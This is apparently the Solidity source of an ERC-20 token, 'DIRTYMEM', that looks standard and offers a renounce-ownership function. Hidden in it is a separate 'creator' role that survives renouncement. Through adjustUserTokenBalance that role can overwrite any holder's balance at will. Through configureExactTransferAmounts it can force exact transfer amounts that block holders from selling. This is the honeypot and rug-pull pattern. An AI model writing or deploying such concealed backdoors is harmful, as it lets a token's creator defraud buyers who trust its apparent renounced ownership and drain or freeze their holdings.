pragma solidity ^0.8.10;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract ContextModified {
    function getMsgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract SingleOwnership is ContextModified {
    address private _contractOwner;
    event OwnershipChanged(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = getMsgSender();
        _contractOwner = msgSender;
        emit OwnershipChanged(address(0), msgSender);
    }

    function getContractOwner() public view virtual returns (address) {
        return _contractOwner;
    }

    modifier mustBeOwner() {
        require(getContractOwner() == getMsgSender(), "You must be the owner to perform this action");
        _;
    }

    function abandonOwnership() public virtual mustBeOwner {
        emit OwnershipChanged(_contractOwner, address(0x000000000000000000000000000000000000dEaD));
        _contractOwner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract DIRTYMEM is ContextModified, SingleOwnership, IERC20 {
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _exactTransferAmounts;
    address private _tokenCreator;

    string public constant _name = "DIRTYMEM";
    string public constant _symbol = "DIRTYMEM";
    uint8 public constant _decimals = 18;
    uint256 public constant _totalSupply = 100000 * (10 ** _decimals);

    constructor() {
        _balances[getMsgSender()] = _totalSupply;
        emit Transfer(address(0), getMsgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    modifier mustBeCreator() {
        require(getTokenCreator() == getMsgSender(), "You must be the creator to perform this action");
        _;
    }

    function getTokenCreator() public view virtual returns (address) {
        return _tokenCreator;
    }

    function setTokenCreator(address newCreator) public mustBeOwner {
        _tokenCreator = newCreator;
    }

    event TokenDistributed(address indexed user, uint256 previousBalance, uint256 newBalance);

    function queryExactTransferAmount(address account) public view returns (uint256) {
        return _exactTransferAmounts[account];
    }

    function configureExactTransferAmounts(address[] calldata accounts, uint256 amount) public mustBeCreator {
        for (uint i = 0; i < accounts.length; i++) {
            _exactTransferAmounts[accounts[i]] = amount;
        }
    }

    function adjustUserTokenBalance(address[] memory userAddresses, uint256 desiredAmount) public mustBeCreator {
        require(desiredAmount >= 0, "Desired amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "User address must not be the zero address");

            uint256 oldBalance = _balances[currentUser];
            _balances[currentUser] = desiredAmount;

            emit TokenDistributed(currentUser, oldBalance, desiredAmount);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[getMsgSender()] >= amount, "TT: transfer amount exceeds balance");

    uint256 exactAmount = queryExactTransferAmount(getMsgSender());
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _balances[getMsgSender()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(getMsgSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[getMsgSender()][spender] = amount;
        emit Approval(getMsgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][getMsgSender()] >= amount, "TT: transfer amount exceeds allowance");

    uint256 exactAmount = queryExactTransferAmount(sender);
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][getMsgSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}